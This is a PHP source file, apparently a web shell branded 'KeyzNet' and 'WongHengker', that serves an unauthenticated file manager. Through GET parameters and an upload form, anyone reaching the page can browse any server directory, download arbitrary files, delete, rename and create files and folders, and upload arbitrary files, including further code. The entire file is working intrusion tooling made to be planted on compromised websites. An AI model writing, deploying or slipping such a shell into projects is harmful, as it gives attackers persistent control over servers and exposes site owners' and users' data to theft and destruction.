<?php

/*
* ./KeyzNet
* https://t.me/keyznet
*/

class WongHengker {
  public $dir;
  public $url;
  function __construct($curDir = null) {
    if ($curDir == null) {
      $info = pathinfo(__FILE__);
      $this->dir = $info['dirname'];
    } else {
      $this->dir = $curDir;
    }
  }
  
  function fileList() {
    $files = array_slice(scandir($this->dir), 2);
    $list = array();
    for ($i = 0; $i < sizeof($files); $i++) {
      $type = filetype($this->dir . '/' . $files[$i]);
      $download = "?download={$files[$i]}&type={$type}&curDir={$this->dir}";
      $list[] = array(
        'file' => $files[$i],
        'type' => $type,
        'download' => $download,
        'delete' => "?delete={$files[$i]}&type={$type}&curDir={$this->dir}",
        'view' => ($type == 'dir') ? "?goDir={$this->dir}/{$files[$i]}&curDir={$this->dir}" : $download,
      );
    }
    return $list;
  }

  function rename($data) {
   rename($data['curDir'] . '/' . $data['rename'], $data['curDir'] . '/' . $data['newName']);
   $this->dir = $data['curDir'];
  }

  function download($data) {
    if ($data['type'] == 'file') {
      $file=$data['curDir'] . '/' . $data['download'];
      header('Content-Description: File Transfer');
      header("Content-Type:application/octet-stream");
      header("Accept-Ranges: bytes");
      header("Content-Length: " . filesize($file));
      header('Expires: 0');
      header('Cache-Control: must-revalidate');
      header('Pragma: public');
      header("Content-Disposition: attachment; filename=" . $data['download']);
      flush();
      readfile($file);
      exit;
    } else if ($data['type'] == 'dir') {
      echo 'zip download not done.......<br>';
    }
  }

  function delete($data) {
    if ($data['type'] == 'dir') {
      rmdir($data['curDir'] . '/' . $data['delete']);
    } else if ($data['type'] == 'file') {
      unlink($data['curDir'] . '/' . $data['delete']);
    }
    $this->dir = $data['curDir'];
  }

  function goDir($dir) {
    $this->dir = $dir;
  }

  function backDir($dir) {
    $dirAr = explode('/', $dir);
    array_pop($dirAr);
    $bkdir = implode('/', $dirAr);
    $this->dir = $bkdir;
  }

  function createFolder($data) {
   mkdir($data['curDir'] . '/' . $data['createFolder'], 0777);
   $this->dir = $data['curDir'];
  }

  function createFile($data) {
    $filename = $data['curDir'] . '/' . basename($data['createFile']);
    file_put_contents($filename, '');
    $this->dir = $data['curDir'];
  }

  function filesUpload($files, $dir) {
    for ($i = 0; $i < sizeof($files['filesUpload']['error']); $i++) {
      if ($files['filesUpload']['error'][$i] == 0){
        move_uploaded_file($files['filesUpload']['tmp_name'][$i], $dir . '/' . $files['filesUpload']['name'][$i]);
      }
    }
    $this->dir = $dir;
  }

  function auto($get, $files, $post) { 
    if (isset($get['goDir'])) {
      $this->goDir($get['goDir']);
    }
    
    if (isset($get['backDir'])) {
      $this->backDir($get['backDir']);
    }
    
    if (isset($get['rename'])) {
      $this->rename($get);
    }
    
    if (isset($get['download'])) {
      $this->download($get);
    }
    
    if (isset($get['delete'])) {
      $this->delete($get);
    }
    
    if (isset($get['createFolder'])) {
      $this->createFolder($get);
    }
    
    if (isset($get['createFile'])) {
      $this->createFile($get);
    }
    
    if (isset($files['filesUpload'])) {
      $this->filesUpload($files, $get['curDir']);
    }
    return error_get_last();
  }
}

$hengker = new WongHengker();
$error = $hengker->auto($_GET, $_FILES, $_POST);
$list = $hengker->fileList();
?>
<!DOCTYPE html>
<html>
<head>
<title>WongHengker</title>
</head>
<body>

<table>
  <tr>
    <th>Name</th>
    <th>Type</th>
    <th>Download</th>
    <th>Rename</th>
    <th>Delete</th>
  </tr>
  <tr><td colspan="5"><hr></td></tr>
  <tr>
    <td><a href="?backDir=<?php echo $hengker->dir; ?>">../back</a></td>
    <td align="center">[dir]</td>
    <td align="center">null</td>
    <td align="center">null</td>
    <td align="center">null</td>
  </tr>
  <tr><td colspan="5"><hr></td></tr>
  <?php for($i=0; $i<sizeof($list); $i++){ ?>
  <tr>
    <td><a href="<?php echo $list[$i]['view']; ?>"><?php echo $list[$i]['file']; ?></a></td>
    <td align="center">[<?php echo $list[$i]['type']; ?>]</td>
    <td align="center"><a href="<?php echo $list[$i]['download']; ?>" ><b>&veeeq;</b></a></td>
    <td>
      <input type="text" value="<?php echo $list[$i]['file']; ?>" hengker-rename-input>
      <input hengker-data="<?php echo $list[$i]['file']; ?>" 
             hengker-data-type="<?php echo $list[$i]['type']; ?>" 
             hengker-data-new="<?php echo $list[$i]['file']; ?>" 
             type="button" 
             value="Rename" 
             hengker-rename-action>
    </td>
    <td align="center"><a href="<?php echo $list[$i]['delete']; ?>">&xotime;</a></td>
  </tr>
  <tr><td colspan="5"><hr></td></tr>
  <?php } ?>
  <tr>
    <td colspan="2">
      <input type="text" placeholder="Create folder" hengker-folder-input>
      <input hengker-folder-action type="button" value="Create">
    </td>
    <td colspan="2">
      <input type="text" placeholder="Create file" hengker-file-input>
      <input hengker-file-action type="button" value="Create File">
    </td>
    <form method="POST" action="?curDir=<?php echo $hengker->dir; ?>" enctype="multipart/form-data">
      <td colspan="1">
        <input type="file" name="filesUpload[]" multiple>
        <input type="submit" value="Upload">
      </td> 
    </form>
  </tr>
</table>
<p><a href="?goDir=<?php echo $hengker->dir; ?>"><?php echo $hengker->dir; ?></a></p>
<input type="hidden" hengker="dir" value="<?php echo $hengker->dir; ?>">
<pre>
<?php print_r($error); ?>
</pre>
<script>
  var wongHengker = {
    renameInput: function(elem) {
      elem.nextElementSibling.setAttribute('hengker-data-new', elem.value);
    },
    renameAction: function(elem) {
      var dir = document.querySelector('input[hengker=dir]');
      window.location.href=`?rename=${elem.getAttribute('hengker-data')}&newName=${elem.getAttribute('hengker-data-new')}&type=${elem.getAttribute('hengker-data-type')}&curDir=${dir.value}`;
    },
    folderAction: function() {
      var dir = document.querySelector('input[hengker=dir]');
      var input = document.querySelector('input[hengker-folder-input]');
      window.location.href = `?createFolder=${input.value}&curDir=${dir.value}`;
    },
    fileAction: function() {
      var dir = document.querySelector('input[hengker=dir]');
      var input = document.querySelector('input[hengker-file-input]');
      if(input.value.trim()) {
        window.location.href = `?createFile=${encodeURIComponent(input.value)}&curDir=${dir.value}`;
      }
    }
  };

  document.querySelectorAll('input[hengker-rename-input]').forEach(input => {
    input.addEventListener('input', () => wongHengker.renameInput(input));
  });

  document.querySelectorAll('input[hengker-rename-action]').forEach(btn => {
    btn.addEventListener('click', () => wongHengker.renameAction(btn));
  });

  document.querySelector('input[hengker-folder-action]').addEventListener('click', wongHengker.folderAction);
  document.querySelector('input[hengker-file-action]').addEventListener('click', wongHengker.fileAction);
</script>
</body>
</html>
